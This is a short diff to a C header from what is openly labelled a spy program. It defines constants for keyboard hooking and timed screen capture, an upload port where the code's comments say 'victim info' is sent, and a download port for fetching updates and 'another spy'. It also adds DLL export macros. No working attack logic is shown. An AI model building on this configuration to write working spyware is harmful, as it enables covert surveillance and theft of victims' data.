@@ -24,5 +24,16 @@
 #define SPY_TMP_KBH_MSZ					20
 #define SPY_IO_IN_SZBUFFER				1024
 #define SPY_NET_SERVER_ADDR				"localhost"
-#define SPY_NET_SERVER_PORT				2512
+#define SPY_NET_SERVER_UPL_PORT			2512		/* upload port, spy will upload victim info here */
+#define SPY_NET_SERVER_DWL_PORT			3393		/* download port, spy will download update pack and another spy... */
 #define SPY_TMR_CAPSCR_INTERVAL			(10 * 1000)	/* capture screen each...(milliseconds) */
+#define SPY_DWL_TMP_DIR_NAME			"tmp"
+
+#define EXPORT __declspec(dllexport)
+#define IMPORT __declspec(dllimport)
+
+#if DLLEXPORT
+#define SPYAPI EXPORT
+#else
+#define SPYAPI IMPORT
+#endif
